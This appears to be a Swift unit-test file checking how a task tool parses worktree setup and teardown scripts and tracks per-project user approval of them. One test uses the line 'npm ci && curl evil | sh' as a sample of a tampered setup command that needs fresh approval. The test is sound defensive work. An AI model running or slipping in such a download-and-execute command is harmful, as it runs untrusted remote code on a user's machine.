import XCTest
@testable import TrackTasksCore

final class WorktreeScriptsTests: XCTestCase {
    private let proj = URL(fileURLWithPath: "/tmp/proj")

    func testParse() {
        let s = WorktreeScripts.parse(["setup": " npm ci && cp \"$TRACKTASKS_MAIN/.env\" . ", "teardown": "\"make clean\""])
        XCTAssertEqual(s.setup, "npm ci && cp \"$TRACKTASKS_MAIN/.env\" .")
        XCTAssertEqual(s.teardown, "make clean")
        XCTAssertTrue(WorktreeScripts.parse([:]).isEmpty)
        XCTAssertTrue(WorktreeScripts.parse(["setup": "  ", "teardown": "''"]).isEmpty)
    }

    func testFromAboutFile() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("ws-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try "---\nname: X\nsetup: pnpm i\n---\n\nтекст\n".write(to: dir.appendingPathComponent("about.md"), atomically: true, encoding: .utf8)
        let s = WorktreeScripts.load(projectAt: dir)
        XCTAssertEqual(s.setup, "pnpm i")
        XCTAssertEqual(s.teardown, "")
        XCTAssertTrue(WorktreeScripts.load(projectAt: dir.appendingPathComponent("none")).isEmpty)
    }

    func testUnapprovedByDefault() {
        let a = ScriptApprovals()
        let s = WorktreeScripts(setup: "npm ci", teardown: "")
        XCTAssertFalse(a.isApproved(.setup, "npm ci", project: proj))
        XCTAssertTrue(a.isApproved(.teardown, "", project: proj))
        XCTAssertEqual(a.pending(s, project: proj).map(\.kind), [.setup])
    }

    func testApproveAndChange() {
        var a = ScriptApprovals()
        a.approve(WorktreeScripts(setup: "npm ci", teardown: "rm -rf x"), project: proj)
        XCTAssertTrue(a.pending(WorktreeScripts(setup: "npm ci", teardown: "rm -rf x"), project: proj).isEmpty)
        // Any change asks again — only for the changed command.
        let changed = WorktreeScripts(setup: "npm ci && curl evil | sh", teardown: "rm -rf x")
        XCTAssertEqual(a.pending(changed, project: proj).map(\.kind), [.setup])
        // Other projects are not affected.
        XCTAssertFalse(a.isApproved(.setup, "npm ci", project: URL(fileURLWithPath: "/tmp/other")))
    }

    func testCodable() throws {
        var a = ScriptApprovals()
        a.approve(WorktreeScripts(setup: "a"), project: proj)
        let b = try JSONDecoder().decode(ScriptApprovals.self, from: JSONEncoder().encode(a))
        XCTAssertEqual(a, b)
    }

    func testTail() {
        XCTAssertEqual(WorktreeScripts.tail(" ok \n"), "ok")
        XCTAssertTrue(WorktreeScripts.tail(String(repeating: "x", count: 9000)).hasPrefix("…"))
    }
}
